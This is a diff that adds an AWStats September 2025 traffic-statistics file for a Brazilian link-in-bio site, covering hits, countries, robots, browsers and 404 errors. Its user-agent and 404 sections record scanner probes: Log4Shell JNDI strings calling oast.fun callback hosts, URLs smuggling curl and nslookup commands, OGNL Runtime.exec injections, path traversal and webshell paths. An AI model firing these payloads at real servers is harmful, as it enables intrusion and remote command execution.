@@ -1,0 +1,1715 @@
+AWSTATS DATA FILE 8.0 (build 20240604)
+# If you remove this file, all statistics for date 202509 will be lost/reset.
+# Last config file used to build this data file was /backup/ilinkbiocom/tmp/awstats/ssl/awstats.conheca.ilinkbio.com.br.conf.
+
+# Position (offset in bytes) in this file for beginning of each section for
+# direct I/O access. If you made changes somewhere in this file, you should
+# also remove completely the MAP section (AWStats will rewrite it at next
+# update).
+BEGIN_MAP 28
+POS_GENERAL 2100                
+POS_TIME 2774                
+POS_VISITOR 32042               
+POS_DAY 34788               
+POS_DOMAIN 3596                
+POS_LOGIN 3982                
+POS_ROBOT 4296                
+POS_WORMS 4798                
+POS_EMAILSENDER 4929                
+POS_EMAILRECEIVER 5072                
+POS_SESSION 35490               
+POS_FILESIZE 54672               
+POS_REQUESTTIME 54796               
+POS_SIDER 35674               
+POS_FILETYPES 5207                
+POS_DOWNLOADS 5924                
+POS_OS 6808                
+POS_BROWSER 7292                
+POS_SCREENSIZE 10621               
+POS_UNKNOWNREFERER 10695               
+POS_UNKNOWNREFERERBROWSER 12018               
+POS_ORIGIN 13112               
+POS_SEREFERRALS 13250               
+POS_PAGEREFS 13394               
+POS_SEARCHWORDS 13683               
+POS_KEYWORDS 13835               
+POS_MISC 2438                
+POS_ERRORS 13894               
+POS_CLUSTER 3838                
+POS_SIDER_404 14047               
+END_MAP
+
+# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value
+# FirstTime   = Date of first visit for history file
+# LastTime    = Date of last visit for history file
+# LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped
+# TotalVisits = Number of visits
+# TotalUnique = Number of unique visitors
+# MonthHostsKnown   = Number of hosts known
+# MonthHostsUnKnown = Number of hosts unknown
+BEGIN_GENERAL 8
+LastLine 20251001051505 6 1184 7473947159818
+FirstTime 20250901063857
+LastTime 20250929202753
+LastUpdate 20251001091343 6 0 5 0 0
+TotalVisits 56                  
+TotalUnique 51                  
+MonthHostsKnown 0                   
+MonthHostsUnknown 76                  
+END_GENERAL
+
+# Misc ID - Pages - Hits - Bandwidth
+BEGIN_MISC 10
+JavascriptDisabled 0 0 0
+DirectorSupport 0 0 0
+RealPlayerSupport 0 0 0
+AddToFavourites 0 4 0
+FlashSupport 0 0 0
+PDFSupport 0 0 0
+WindowsMediaPlayerSupport 0 0 0
+QuickTimeSupport 0 0 0
+JavaEnabled 0 0 0
+TotalMisc 0 0 0
+END_MISC
+
+# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth
+BEGIN_TIME 24
+0 6 35 7739819 0 5 796
+1 2 5 109055 2 10 208860
+2 3 6 110277 2 12 6823446
+3 42 42 358422 241 279 8530207
+4 96 102 1765612 116 123 320670
+5 88 119 8576797 113 120 139362
+6 79 88 1615652 151 187 9531926
+7 70 73 666962 124 158 1284117
+8 104 164 12912716 100 116 728645
+9 85 95 1829391 98 105 173727
+10 63 65 633575 135 143 1027216
+11 97 106 1098247 101 101 80378
+12 115 121 1796023 199 223 1699990
+13 84 106 1493983 105 115 195952
+14 41 60 910480 140 147 3967814
+15 7 49 7911666 36 76 5258473
+16 1 2 53800 1 2 0
+17 4 8 231866 2 9 100257
+18 6 17 420633 0 3 113549
+19 0 6 316276 3 13 467981
+20 16 90 17242214 113 115 4251123
+21 5 5 231400 3 3 10308
+22 4 21 179527 3 4 168665
+23 1 10 254426 2 6 23347
+END_TIME
+
+# Domain - Pages - Hits - Bandwidth
+# The 25 first Pages must be first (order not required for others)
+BEGIN_DOMAIN 12
+us 915 1075 30511330
+ro 68 68 512582
+br 14 193 29207754
+vn 6 6 0
+in 4 29 7619578
+gb 3 10 89287
+ca 3 5 231400
+ru 2 4 101535
+bg 1 1 8742
+be 1 1 8742
+de 1 1 46280
+cn 1 2 121589
+END_DOMAIN
+
+# Cluster ID - Pages - Hits - Bandwidth
+BEGIN_CLUSTER 0
+END_CLUSTER
+
+# Login - Pages - Hits - Bandwidth - Last visit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_LOGIN 5
+admin 8 8 69936 20250903103914
+user 3 3 26226 20250903083213
+{{username}} 2 2 17484 20250903130959
+guest 1 1 8742 20250903082158
+maint 1 1 8742 20250903043347
+END_LOGIN
+
+# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt
+# The 25 first Hits must be first (order not required for others)
+BEGIN_ROBOT 9
+no_user_agent 318 10240152 20250911035401 0
+bot[\s_+:,\.\;\/\\-] 124 9206184 20250910204721 2
+facebookexternalhit/ 54 2250429 20250929222042 1
+AhrefsBot/ 46 20660271 20250913025005 6
+bingbot/ 20 484249 20250906034515 1
+Googlebot/ 11 83942 20250930173112 10
+Googlebot\-Image/ 6 248487 20250919104840 0
+Dalvik/ 3 225927 20250917221603 0
+Applebot/ 2 17484 20250906195853 1
+END_ROBOT
+
+# Worm ID - Hits - Bandwidth - Last visit
+# The 5 first Hits must be first (order not required for others)
+BEGIN_WORMS 0
+END_WORMS
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first Hits must be first (order not required for others)
+BEGIN_EMAILSENDER 0
+END_EMAILSENDER
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first hits must be first (order not required for others)
+BEGIN_EMAILRECEIVER 0
+END_EMAILRECEIVER
+
+# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression
+BEGIN_FILETYPES 38
+Unknown 311 2727788 0 0
+png 207 52626172 0 0
+ccp 1 8742 0 0
+jsp 16 139872 0 0
+cgi 21 186152 0 0
+lp 1 8742 0 0
+jpg 13 227844 0 0
+esp 2 17484 0 0
+hello 1 8742 0 0
+vm 1 7520 0 0
+htm 1 8742 0 0
+xml 65 2970662 0 0
+portal 2 17484 0 0
+do 3 26226 0 0
+pl 1 8742 0 0
+cfm 4 34968 0 0
+php7 1 8742 0 0
+aspx 3 26226 0 0
+css 65 546198 0 0
+xhtml 1 8742 0 0
+woff2 21 2013564 0 0
+py 3 26226 0 0
+action 25 218550 0 0
+axd 1 7520 0 0
+ashx 2 17484 0 0
+json 17 130284 0 0
+env 1 46280 0 0
+cfc 2 17484 0 0
+csv 1 8742 0 0
+php 194 1881188 0 0
+js 65 753387 0 0
+index 1 8742 0 0
+fun 1 8742 0 0
+dll 2 17484 0 0
+asmx 1 8742 0 0
+html 311 3367500 0 0
+txt 25 293626 0 0
+exe 2 17484 0 0
+END_FILETYPES
+
+# Downloads - Hits - Bandwidth
+BEGIN_DOWNLOADS 21
+/32B4qHshljQ2rMrN9sBKoJ1o3U2.txt 3 0 26226
+/global-protect/portal/images/32B4q6lYujNWp9EPectv2d0rDIb.txt 2 0 17484
+/fileserver/32B4qIg29rC6iGXhP1RU0GuOKxz.txt 2 0 17484
+/.well-known/security.txt 2 0 92560
+/include/xpnm.txt 1 0 8742
+/wp-content/plugins/backup-backup/readme.txt 1 0 8742
+/file/RAvVbX.txt 1 0 8742
+/objects/ihsdf.txt 1 0 8742
+/php/config/output.txt 1 0 8742
+/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/32B4qCvsNl57D1zDZ67HTfd5nF3.txt 1 0 8742
+/common/mlswx.txt 1 0 8742
+/WoVYdQ.txt 1 0 8742
+/NgDog/CVE-2023-47246.txt 1 0 8742
+/etc/mnt_info.csv 1 0 8742
+/wp-content/plugins/import-xml-feed/readme.txt 1 0 8742
+/objects/lOgP.txt 1 0 8742
+/yDKUbYcDBG.txt 1 0 8742
+/pDbwPk.txt 1 0 8742
+/Assets/temp/hotspot/img/logohotspot.txt 1 0 8742
+/wp-content/plugins/media-library-assistant/readme.txt 1 0 8742
+/test.txt 1 0 8742
+END_DOWNLOADS
+
+# OS ID - Hits
+BEGIN_OS ID - Hits - Pages 31
+win10 287 219
+macos11 4 3
+winxp 2 2
+macosx14 7 7
+android 33 4
+winlong 2 2
+linuxubuntu 80 79
+macosx13 13 12
+macosx6 3 3
+macosx 53 51
+macos12 2 2
+linux 297 274
+Unknown 90 43
+ios_iphone 31 5
+win7 4 4
+macosx7 1 0
+win8 4 4
+macosx12 4 4
+macosx10 3 3
+win11 13 13
+macosx9 5 5
+macosx15 240 169
+android12 4 1
+linuxdebian 38 38
+macosx11 3 3
+unix 13 13
+android10 103 4
+androidlollipop 2 2
+macosx8 2 2
+linuxcentos 51 47
+win8.1 1 1
+END_OS
+
+# Browser ID - Hits - Pages
+BEGIN_BROWSER 186
+safari9.0.3 1 1
+firefox116.0 4 4
+safari18.1.1 8 8
+chrome139.0.0.0 9 3
+chrome58.0.3029.110 2 2
+edge114 2 2
+chrome120.0.0.0 10 10
+chrome117.0.0.0 1 1
+chrome122.0.0.0 13 13
+safari 35 32
+safari18.0.1 2 2
+firefox129.0 8 7
+safari18.3.1 10 10
+firefox115.0 7 7
+safari15.6.6 2 2
+safari13.1 2 2
+safari9.1.2 4 4
+chrome41.0.2226.0 1 1
+edge104 2 2
+safari8.0 3 3
+chrome103.0.0.0 5 5
+chrome126.0.0.0 20 19
+chrome131.0.0.0 34 8
+edge18 1 1
+safari12.0.2 1 1
+chrome134.0.0.0 17 17
+msie8.0 2 2
+edge14 1 1
+chrome62.0.3202.94 2 1
+safari17.9 1 1
+safari16.3 2 2
+safari18.2 4 3
+safari16.6 2 2
+safari15.4 2 2
+safari12.1.2 3 3
+chrome110.0.0.0 1 1
+safari5.0.4 2 2
+chrome127.0.0.0 16 16
+firefox118.0 3 3
+chrome88.0.4240.193 76 76
+firefox124.0 12 12
+chrome87.0.4280.141 67 67
+Unknown 34 22
+chrome116.0.0.0 2 2
+safari17.0.96 1 1
+safari16.5 2 2
+safari16.1 6 6
+edge12 1 1
+safari5.0.3 1 1
+firefox104.0 1 1
+firefox98.0 2 2
+safari13.0.3 6 6
+firefox99.0 3 3
+chrome74.0.3729.169 1 1
+chrome88.0.4324.182 1 0
+firefox134.0 15 15
+firefox112.0 1 1
+chrome125.0.0.0 14 12
+safari10.1.2 2 2
+chrome96.0.4664.45 6 6
+chrome140.0.0.0 104 9
+firefox91.0 3 3
+safari16.6.1 4 4
+edge17 3 3
+firefox117.0 3 2
+safari18.3 8 7
+chrome91.0.4472.124 1 1
+safari17.11 2 2
+safari18.6 2 0
+safari16.2 1 1
+firefox94.0 1 1
+safari17.4.1 2 2
+chrome115.0.0.0 2 2
+safari13.0.1 4 4
+chrome17.0.963.56 1 0
+edge117 1 1
+safari13.1.1 2 2
+iphone 28 4
+chrome117.0.5938.132 27 4
+safari14.0.2 1 1
+safari18.5 34 8
+safari18.1 5 4
+chrome39.0.2171.99 1 1
+chrome140.0.7339.51 29 4
+chrome138.0.0.0 1 0
+firefox139.0 1 1
+edge107 1 1
+safari18.0 4 4
+chrome123.0.0.0 17 17
+safari14.1.2 5 5
+firefox119.0 1 1
+safari17.8 1 1
+safari6.0.2 2 2
+chrome121.0.0.0 41 24
+safari15.5 1 1
+safari15.1 1 1
+safari15.0 2 2
+safari14.0.3 1 1
+firefox126.0 14 14
+mozilla 54 19
+safari17.3.56 1 1
+safari5.1 2 2
+firefox123.0 16 14
+safari17.2.1 3 3
+chrome132.0.0.0 11 11
+firefox120.0 14 14
+chrome114.0.0.0 6 3
+safari15.3 4 4
+safari16.5.2 2 2
+safari15.6 6 5
+safari16.4 6 6
+edge102 1 1
+firefox125.0 16 16
+firefox121.0 18 17
+chrome129.0.0.0 19 18
+firefox100.0 2 2
+chrome130.0.0.0 42 2
+firefox93.0 1 1
+firefox128.0 12 12
+safari14.1.1 2 2
+firefox137.0 4 4
+netscape5.0 2 2
+chrome104.0.5112.81 1 1
+safari17.6 1 1
+safari11.1 4 3
+safari14.0.1 2 2
+chrome81.0.4044.129 1 1
+firefox132.0 20 20
+safari13.1.2 2 2
+safari17.0 11 11
+chrome137.0.0.0 2 0
+chrome90.0.4430.93 1 1
+chrome119.0.0.0 21 20
+safari17.5 3 3
+edge120 1 1
+safari13.0.5 1 1
+safari13.0.2 1 1
+chrome124.0.0.0 14 13
+firefox114.0 1 1
+firefox96.0 1 1
+safari15.6.3 1 1
+firefox122.0 10 10
+chrome73.0.3683.90 2 2
+safari17.0.1 1 1
+chrome118.0.0.0 6 6
+firefox102.0 3 3
+chrome78.0.3904.108 2 2
+edge108 1 1
+safari4.0 2 2
+firefox127.0 14 13
+safari9.1.1 1 1
+chrome135.0.0.0 12 10
+samsung 4 0
+chrome138.0.7204.23 8 1
+safari17.6.1 1 1
+safari15.6.7 1 1
+safari11.1.1 2 2
+safari17.3.1 4 4
+chrome104.0.0.0 2 2
+safari14.0 2 2
+safari18.4 4 4
+chrome64.0.3282.140 4 4
+safari15.2 1 1
+firefox128.9 1 1
+chrome128.0.0.0 11 10
+safari17.2 3 3
+chrome133.0.0.0 17 16
+firefox130.0 8 8
+edge109 1 1
+edge129 2 2
+safari16.4.1 1 1
+safari15.6.1 6 6
+firefox135.0 12 12
+firefox131.0 4 4
+safari12.1.1 1 1
+chrome85.0.4183.127 1 1
+safari17.7 4 4
+safari17.8.1 4 4
+firefox89.0 1 1
+firefox133.0 29 29
+chrome91.0.4472.168 1 1
+edge126 2 2
+edge106 1 1
+android 1 0
+safari17.10 2 2
+chrome109.0.0.0 1 1
+END_BROWSER
+
+# Screen size - Hits
+BEGIN_SCREENSIZE 0
+END_SCREENSIZE
+
+# Unknown referer OS - Last visit date
+BEGIN_UNKNOWNREFERER 16
+Mozilla/5.0_zgrab/0.x 20250909044000
+Mozila/5.0 20250903023810
+Iframely/1.3.1_(_https://iframely.com/docs/about) 20250919182002
+\ 20250902031748
+${jndi:ldap://127.0.0.1#.${hostName}.useragent.d2ru2kiehk618b0qvi90hnysy3fpheyfo.oast.fun} 20250903091517
+${jndi:ldap://127.0.0.1#.${hostName}.useragent.d2ru2kiehk618b0qvi90x6wfrw57a19o7.oast.fun} 20250903090810
+python-requests/2.26.0 20250903130634
+${jndi:ldap://127.0.0.1#.${hostName}.useragent.d2ru2kiehk618b0qvi90dof3abgcbwzot.oast.fun} 20250903092236
+Mozilla/5.0_(compatible;_InternetMeasurement/1.0;__https://internet-measurement.com/) 20250906084523
+Hello_from_Palo_Alto_Networks,_find_out_more_about_our_scans_in_https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity 20250917214122
+Mozilla/5.0_(compatible;_CensysInspect/1.1;__https://about.censys.io/) 20250929123524
+WhatsApp/2.23.20.0 20250927131042
+${jndi:ldap://${:-137}${:-985}.${hostName}.useragent.d2ru2kiehk618b0qvi90exn9rtdtpd67z.oast.fun} 20250903092311
+${jndi:ldap://${:-137}${:-985}.${hostName}.useragent.d2ru2kiehk618b0qvi90ecddbxzxahr6d.oast.fun} 20250903090932
+AVAYA 20250903114750
+${jndi:ldap://${:-137}${:-985}.${hostName}.useragent.d2ru2kiehk618b0qvi9015jqdwybm8ifa.oast.fun} 20250903093835
+END_UNKNOWNREFERER
+
+# Unknown referer Browser - Last visit date
+BEGIN_UNKNOWNREFERERBROWSER 13
+AVAYA 20250903114750
+${jndi:ldap://${:-137}${:-985}.${hostName}.useragent.d2ru2kiehk618b0qvi9015jqdwybm8ifa.oast.fun} 20250903093835
+${jndi:ldap://${:-137}${:-985}.${hostName}.useragent.d2ru2kiehk618b0qvi90ecddbxzxahr6d.oast.fun} 20250903090932
+WhatsApp/2.23.20.0 20250927131042
+${jndi:ldap://${:-137}${:-985}.${hostName}.useragent.d2ru2kiehk618b0qvi90exn9rtdtpd67z.oast.fun} 20250903092311
+Hello_from_Palo_Alto_Networks,_find_out_more_about_our_scans_in_https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity 20250917214122
+${jndi:ldap://127.0.0.1#.${hostName}.useragent.d2ru2kiehk618b0qvi90dof3abgcbwzot.oast.fun} 20250903092236
+${jndi:ldap://127.0.0.1#.${hostName}.useragent.d2ru2kiehk618b0qvi90hnysy3fpheyfo.oast.fun} 20250903091517
+${jndi:ldap://127.0.0.1#.${hostName}.useragent.d2ru2kiehk618b0qvi90x6wfrw57a19o7.oast.fun} 20250903090810
+python-requests/2.26.0 20250903130634
+Mozila/5.0 20250903023810
+Iframely/1.3.1_(_https://iframely.com/docs/about) 20250919182002
+\ 20250902031748
+END_UNKNOWNREFERERBROWSER
+
+# Origin - Pages - Hits 
+BEGIN_ORIGIN 6
+From0 864 948
+From1 9 9
+From2 0 0
+From3 5 6
+From4 141 432
+From5 0 0
+END_ORIGIN
+
+# Search engine referers ID - Pages - Hits
+BEGIN_SEREFERRALS 0
+END_SEREFERRALS
+
+# External page referers - Pages - Hits
+# The 25 first Pages must be first (order not required for others)
+BEGIN_PAGEREFS 3
+https://brancaelegance.ilinkbio.com.br 3 3
+https://viladoartesanato.ilinkbio.com.br 2 2
+http://177.11.54.229:80/.well-known/security.txt 0 1
+END_PAGEREFS
+
+# Search keyphrases - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_SEARCHWORDS 0
+END_SEARCHWORDS
+
+# Search keywords - Number of search
+# The 25 first number of search must be first (order not required for others)
+BEGIN_KEYWORDS 0
+END_KEYWORDS
+
+# Errors - Hits - Bandwidth
+BEGIN_ERRORS 6
+404 1306 1039576
+403 17 7870
+406 1 779
+302 129 99459
+206 10 530145
+500 1 800
+END_ERRORS
+
+# URL with 404 errors - Hits - Last URL referrer
+BEGIN_SIDER_404 549
+/service/extdirect 2 -
+/mailingupgrade.php 2 -
+/cbrfo.php 1 -
+/mgmt/shared/iapp/rpm-spec-creator 2 -
+/cgi-bin/luci/ 6 -
+/Collector/nms/addModifyZTDProxy 2 -
+/authenticationendpoint/32b4qelxwzc2fmysd7uug8emisv.jsp 2 -
+/admin/index.php 2 -
+/application/.env 1 -
+/apisix/batch-requests 2 -
+/test.txt 2 -
+/fuel/pages/select/ 2 -
+/elFinder/php/connector.minimal.php 2 -
+/32B4qIjKjPhvOQ1ePWGSRABkGze.jsp 2 -
+/api/experimental/test 2 -
+/32B4qDNZlvfK1Z5c8sC2wQI5GKn.jsp 2 -
+/test.php 2 -
+/v2.php 1 -
+/lc.php 1 -
+/api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20d2ru2kiehk618b0qvi905a7usodctag4r.oast.fun 1 -
+/pp.php 3 -
+/we.php 2 -
+/apply_sec.cgi 6 https://www.conheca.ilinkbio.com.br/login_pic.asp
+/index.action 14 -
+/api/agent/tabs/agentData 2 -
+/user.action 2 -
+/inc.php 1 -
+/h0aeabaxnF.php 2 -
+/logupload 2 https://www.conheca.ilinkbio.com.br
+/moveitisapi/moveitisapi.dll 4 -
+/webadmin/tools/unixlogin.php 2 https://www.conheca.ilinkbio.com.br/webadmin/admin/service_manager_data.php
+/ajaxPages/writeBrowseFilePathAjax.php 2 -
+/attachment/20/bcabc.php 1 -
+/invoker/readonly 2 -
+/clients/editclient.php 2 -
+/yasnu.php 1 -
+/bin/view/%22%5d%5d%20%7b%7basync%20async%3d%22true%22%20cached%3d%22false%22%20context%3d%22doc.reference%22%7d%7d%7b%7bpython%7d%7dprint%283724348%20%2a%208473334%29%7b%7b%2fpython%7d%7d%7b%7b%2fasync%7d%7d 2 -
+/ffile.php 1 -
+/file.php 1 -
+/userentry 2 -
+/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index 2 -
+/cobbler_api 2 -
+/guest_auth/guestIsUp.php 2 -
+/gmo.php 2 -
+/.env.example 1 -
+/bonita/loginservice 2 -
+/arrow.flight.protocol.FlightService/DoPut 2 -
+/file5.php 1 -
+/node/1 2 -
+/AdminService/urest/v1/LogonResource 2 -
+/jquery.php 1 -
+/json 8 -
+/search/ 4 -
+/fork.php 1 -
+/druid/indexer/v1/sampler 4 -
+/model-versions/get-artifact 2 -
+/cgi-bin/kerbynet 3 -
+/api/timelion/run 2 -
+/cgi-bin/nightled.cgi 3 -
+/bsh.servlet.BshServlet 2 -
+/include/file.php 2 -
+/class20.php 1 -
+/tmui/locallb/workspace/tmshCmd.jsp 6 -
+/system_log.php 1 -
+/mifs/. 2 https://www.conheca.ilinkbio.com.br
+/objects/ihsdf.txt 2 -
+/wfs 1 -
+/wp-content/plugins/hellopress/wp_filemanager.php 2 -
+/file-manager/ 2 -
+/crowd/admin/uploadplugin.action 2 -
+/run 2 -
+/objects/getImageMP4.php 2 -
+/old____tesla.php 1 -
+/MARIJUANA.php 1 -
+/upload 4 -
+/claa.php 1 -
+/api/clusters 2 -
+/API/regionsDiscovery.php 1 -
+/manager.php 1 -
+/loadfile.lp 2 -
+/app 14 -
+/account 4 -
+/api/content/ 2 -
+/nagiosxi/login.php 6 -
+/phpinfo.php 1 -
+/wp-content/plugins/wsecure/wsecure-config.php 2 -
+/webtools/control/main/ProgramExport 4 -
+/modules/Rubrics/rubrics_visualise_saveAjax.php 2 -
+/fe5.php 1 -
+/des.php 1 -
+/classes/common/busiFacade.php 2 -
+/node_modules/angular-base64-upload/demo/server.php 2 -
+/32B4qHshljQ2rMrN9sBKoJ1o3U2.txt 6 -
+/cgi-bin/MANGA/index.cgi 3 -
+/_images/4ylKWz 2 -
+/PhoneBackup/GUAWBOwt.php 4 -
+/%2577eb%2575i_%2577sma_Http 2 -
+/login.action 6 -
+/tmui/login.jsp/.. 6 -
+/human.aspx 2 -
+/OA_CGI/FNDWRR.exe 2 -
+/cgi-bin/network_config/nsg_masq.cgi 3 -
+/chaosblade 2 -
+/password_change.cgi 2 https://www.conheca.ilinkbio.com.br
+/asasx.php 1 -
+/krypton.php 1 -
+/Collector/diagnostics/trace_route 2 -
+/NmAPI/RecurringReport 2 -
+/STATE_ID/123/agentLogUploader 2 -
+/gfile1.php 1 -
+/management/export.php 2 -
+/cgi-bin/system_mgr.cgi 6 -
+/data/cache_template/rss.tpl.php 2 -
+/autoload_classmap.php 1 -
+/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08 2 -
+/login/ 4 -
+/wp-admin/admin-post.php 2 -
+/config.json 1 -
+/cbgd.php 1 -
+/WSStatusEvents/EventHandler.asmx 2 -
+/photo/p/api/album.php 4 -
+/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/32B4qCvsNl57D1zDZ67HTfd5nF3.txt 2 -
+/vendor/htmlawed/htmlawed/htmLawedTest.php 6 -
+/admin/.env 1 -
+/assets/vendor/swiper/swiper-bundle.min.js.map 2 -
+/rjv.php 1 -
+/auth/check 2 -
+/var 2 https://www.conheca.ilinkbio.com.br
+/Assets/temp/hotspot/img/logohotspot.txt 2 -
+/include/exportUser.php 2 -
+/assets/data/usrimg/32b4qcgadbxcd020laeixomeqpc.php 2 -
+/wio.php 1 -
+/test.hello 2 -
+/api/jobs/ 2 -
+/goat.php 1 -
+/Collector/diagnostics/ping 2 -
+/inc/jquery/uploadify/uploadify.php 2 -
+/sitemap.xml 1 -
+/webadmin/out 2 https://www.conheca.ilinkbio.com.br/webadmin/admin/service_manager_data.php
+/templates/editor-preload-container 2 -
+/ddns_check.ccp 2 -
+/api/remote 1 -
+/owa/auth/x.js 2 -
+/umotion/modules/reporting/track_import_export.php 2 -
+/cgi-bin/cstecgi.cgi 9 https://www.conheca.ilinkbio.com.br/page/index.html
+/objects/lOgP.txt 2 -
+/fw.login.php 2 -
+/ez.php 1 -
+/zimbraAdmin/0MVzAe6pgwe5go1D.jsp 4 -
+/servlet/UploadServlet 2 -
+/wp-json/lp/v1/load_content_via_ajax/ 2 -
+/cgi-bin/admin.cgi 3 -
+/integration/saveGangster.action 2 -
+/wp-content/plugins/wpcargo/includes/32B4qFozswjTr6kasImPPRCUVLj.php 4 -
+/wls-wsat/CoordinatorPortType 11 -
+/wsman 2 -
+/EemAdminService/EemAdmin 2 -
+/bypass/config 2 -
+/css.php 1 -
+/gremlin 2 -
+/boardDataWW.php 2 -
+/v1/backend1 2 -
+/api/hassio_ingress/.%09./supervisor/info 2 -
+/dfre.php 1 -
+/deserialize 4 -
+/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc 2 -
+/C1.php 1 -
+/session/login 2 -
+/meta 2 -
+/com.example.TestService 2 -
+/objects/getImage.php 2 -
+/api/json 6 -
+/task/submit/ 2 -
+/phpinfo 1 -
+/api/push 2 -
+/wp-content/plugins/vr-calendar-sync/assets/js/public.js 2 -
+/ajax-api/2.0/mlflow/model-versions/create 4 -
+/wp-content/plugins/backup-backup/readme.txt 2 -
+/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php 2 -
+/xmlrpc 2 -
+/public/css/32B4qJqCY4uVxZs5N6aa7POXzuX.css 2 -
+/CLA.php 1 -
+/api/v1 2 -
+/bower_components/angular-base64-upload/demo/server.php 2 -
+/32B4qFtDnaPQ4A4Thq4ku40IoP1 2 -
+/ava.php 1 -
+/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X- 2 -
+/tmui/locallb/workspace/fileSave.jsp 2 -
+/r4f_1.php 1 -
+/app/options.py 6 -
+/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php 2 -
+///CFIDE/adminapi/accessmanager.cfc 2 -
+/pages/createpage-entervariables.action 6 -
+/php-cgi/php-cgi.exe 2 -
+/32B4qG3qVm3ebgZl9m1Yli3FtaN.jsp/ 2 -
+/tools.cgi 4 https://www.conheca.ilinkbio.com.br/tools.cgi
+/esp/cms_changeDeviceContext.esp 2 -
+/.env.prod 1 -
+/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm 2 -
+/lucee/32B4qFJZ7VkGSK4KsUTtHk8hhmo.cfm 2 -
+/__debugging_center_utils___.php 4 -
+/csrf 2 -
+/cfile.php 1 -
+/network_test.php 2 -
+/new.php 1 -
+/simpleeditor/common/commonReleaseNotes.do 2 -
+/fileserver/32B4qIg29rC6iGXhP1RU0GuOKxz.txt 4 -
+/web/google_analytics.php 2 -
+/pfblockerng/www/index.php 4 -
+/talari/app/files/32B4qGDWPkC6bRLQ5jYeJ9yeKv5 2 -
+/graph_realtime.php 2 -
+/_async/AsyncResponseService 2 -
+/xc.php 1 -
+/jeecg-boot/jmreport/queryFieldBySql 2 -
+/api/file/formimage 2 -
+/boafrm/formSysCmd 2 -
+/php/connector.minimal.php 2 -
+/cgi-bin/execute_cmd.cgi 3 -
+/emap/devicePoint_addImgIco 2 -
+/Uploads/32B4qIlyH3G8oz8V0OnyeQsDoDx.php7 2 -
+/cgi-bin/file_transfer.cgi 3 -
+/.env.save 1 -
+/confluence/pages/createpage-entervariables.action 4 -
+/admin/login 3 -
+/GponForm/diag_Form 4 -
+/spip.php 2 -
+/mgmt/tm/util/bash 6 -
+/api/server/version 4 -
+/dev/.env 1 -
+/getsamplebacklog 2 -
+/console/images/%252e%252e%252fconsole.portal 2 -
+/_profiler/phpinfo 1 -
+/api/jsonws/invoke 4 https://www.conheca.ilinkbio.com.br/api/jsonws
+/images/logo/logo-eoffice.php 2 -
+/api/operations/ciscosb-file:form-file-upload 2 -
+/search.php 2 -
+/v1/api 2 -
+/file/RAvVbX.txt 2 -
+/fileupload/toolsAny 2 -
+/api/.env 1 -
+/main/webservices/additional_webservices.php 2 -
+/ajax-api/2.0/mlflow/registered-models/create 2 -
+/api/v2/observables/extended 2 -
+/ar.php 1 -
+/goform/aspForm 2 -
+/file-manager/backend/permissions 2 -
+/webadmin/script 2 -
+/api/jobs/Job_QOjNJf/logs 2 -
+/index.html 6 -
+/invoker/EJBInvokerServlet/ 2 -
+/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage 2 -
+/flash/addcrypted2 4 -
+/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20d2ru2kiehk618b0qvi90deqtjy8wr66s1.oast.fun%22%29%7D/ 1 -
+/app/modules/ut-cac/admin/cli.php 1 -
+/axx.php 2 -
+/downloader.php 2 -
+/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 2 -
+/php/config/output.txt 2 -
+/goform/setmac 2 https://www.conheca.ilinkbio.com.br/index.htmlr
+/progs/homepage 2 -
+/guestaccess.aspx 2 -
+/SDK/webLanguage 2 -
+/cgi-bin/mainfunction.cgi/cvmcfgupload 3 -
+/service/extension/backup/mboximport 4 -
+/-/media/doo-doo.ashx 2 -
+/api/session/properties 2 -
+/api/v1/snapshots 2 -
+/users/user-dark-features 2 -
+/goform/formWsc 2 -
+/file17.php 1 -
+/html/ad/adpesquisasql/request/processVariavel.php 2 -
+/global-protect/portal/images/32B4q6lYujNWp9EPectv2d0rDIb.txt 4 -
+/cgi-bin/libagent.cgi 3 -
+/login.htm 2 -
+/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08 2 -
+/api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20d2ru2kiehk618b0qvi906e3zmj36oxr9p.oast.fun 1 -
+/pDbwPk.txt 1 -
+/apriso/portal/kiosk/querylogin.aspx 2 -
+/520.php 1 -
+/32B4qKd5uJ2K1Mf3exhA5Hcj6sH.php 2 -
+/webtools/control/forgotPassword/xmldsdump 2 -
+/wp-gr.php 2 -
+/template/custom/content-editor 2 -
+/Collector/storagemgmt/apply 2 -
+/php/change_config.php 4 -
+/ajax/openvpn/del_ovpncfg.php 2 -
+/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 2 -
+/tund.php 1 -
+/cgi-bin/vitogate.cgi 9 -
+/co.php 1 -
